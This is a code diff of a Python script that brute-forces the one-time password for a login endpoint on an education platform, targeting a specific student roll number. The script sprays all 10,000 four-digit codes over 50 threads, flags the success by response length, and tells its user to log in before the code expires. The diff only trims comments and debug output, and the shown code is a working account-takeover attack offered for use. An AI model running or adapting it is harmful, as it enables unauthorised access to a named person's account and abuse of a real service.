@@ -6,7 +6,6 @@ import time
 
 init(autoreset=True)
 
-# Banner Display
 print(f"{Fore.YELLOW} ________        __                __                      __           ")
 print(f"{Fore.YELLOW}/        |      /  |              /  |                    /  |          ")
 print(f"{Fore.YELLOW}$$$$$$$$/   ____$$ | __   __   __ $$/   _______   ______  $$ | __    __ ")
@@ -29,7 +28,6 @@ print(f"{Fore.RED}After the program gives out the correct OTP, Immediately login
 print(f"{Fore.RED}Since the OTP is valid only for 10 minutes.")
 
 url = 'https://dbchangesstudent.edwisely.com/auth/v3/getUserDetails'
-
 
 params = {
     'roll_number': '111723104080',
@@ -55,7 +53,7 @@ headers = {
 }
 
 def perform_attack():
-    num_workers = 50  # Number of concurrent threads
+    num_workers = 50  
     num_otp_per_thread = (10000 + num_workers - 1) // num_workers
 
     correct_otps = []
@@ -84,9 +82,7 @@ def check_otp_range(start, end):
         params['otp'] = otp
         try:
             response = requests.get(url, params=params, headers=headers, verify=True)
-            response_length = len(response.text)
-            print(f"OTP: {otp}, Response Length: {response_length}")
-            if response.status_code == 200 and response_length > 1000:  
+            if response.status_code == 200 and len(response.text) > 1000:  
                 return otp
         except requests.RequestException as e:
             print(f"{Fore.RED}Request failed for OTP {otp}: {e}")
@@ -97,3 +93,6 @@ perform_attack()
 
 while True:
     time.sleep(1)
+
+
+    
